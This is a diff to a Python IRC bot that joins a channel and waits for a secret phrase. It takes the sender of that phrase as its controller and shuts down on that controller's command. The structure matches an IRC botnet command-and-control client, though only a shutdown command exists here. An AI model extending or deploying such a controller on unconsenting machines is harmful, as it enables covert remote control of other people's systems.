@@ -38,33 +38,41 @@ def connectToIRC():
                 nickSet = True                                                  # Change nickSet flag to true
                 joinChannel(CHANNEL)
     except Exception as e:
-        print("Error: " + str(e))
+        print("Error1: " + str(e))
         time.sleep(5)
 
 
 # Function that monitors IRC message traffic to find messages containing the keyword
 def listen():
     global controllerNick
+    madeContactWithControl = False
     try:
         while(True):
             ircmessage = IRCconnection.recv(512)
             ircmessage = ircmessage.decode("utf-8")
             print("received: " + ircmessage)
             splitmessage = ircmessage.split()
-            if(ircmessage.isspace()):
-                IRCconnection.close()
-                main()                                                          # Server trying to kick -
-            if((len(splitmessage) > 0) & (splitmessage[0] == "PING")):          # Prevent inactive connection from closing
-                IRCconnection.sendall(b'PONG\r\n')
-                print("sent: PONG")
-            elif (SECRET_PHRASE in splitmessage):                               # Detect use of SECRET_PHRASE as message in CHANNEL
-                print("secret phrase detected")                                 #TODO: what is sufficient proof of the secret phrase?
-                controllerNick = (splitmessage[0].split("!")[0])[1:]            # Get nick of user who sent secret phrase as stand alone message
-                print("controller nick is: " + controllerNick)
+            if(ircmessage.isspace()):                                           # Server trying to kick bot
+                IRCconnection.close()                                           # Close connection to IRC
+                return                                                          # Attempt to reconnect in main
             else:
-                print("in else")
+                if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):      # Prevent inactive connection from closing
+                    IRCconnection.sendall(b'PONG\r\n')
+                    print("sent: PONG")
+                elif (SECRET_PHRASE in splitmessage):                           # Detect use of SECRET_PHRASE as message in CHANNEL
+                    print("secret phrase detected")                             #TODO: what is sufficient proof of the secret phrase?
+                    controllerNick = (splitmessage[0].split("!")[0])[1:]        # Get nick of user who sent secret phrase as stand alone message
+                    madeContactWithControl = True
+                    print("controller nick is: " + controllerNick)
+                elif(len(splitmessage) > 3):
+                    lastWord = (splitmessage[len(splitmessage)-1])[1:]                           # Get first word of messeage - drop ':' char
+                    nickOfSender = (splitmessage[0].split("!")[0])[1:]
+                    if((lastWord == "shutdown") and (madeContactWithControl) and (nickOfSender == controllerNick)):
+                        shutdownBot()
+                    print("received word: " + lastWord)
+
     except Exception as e:
-        print("Error: " + str(e))
+        print("Error2: " + str(e))
         main()
 
 
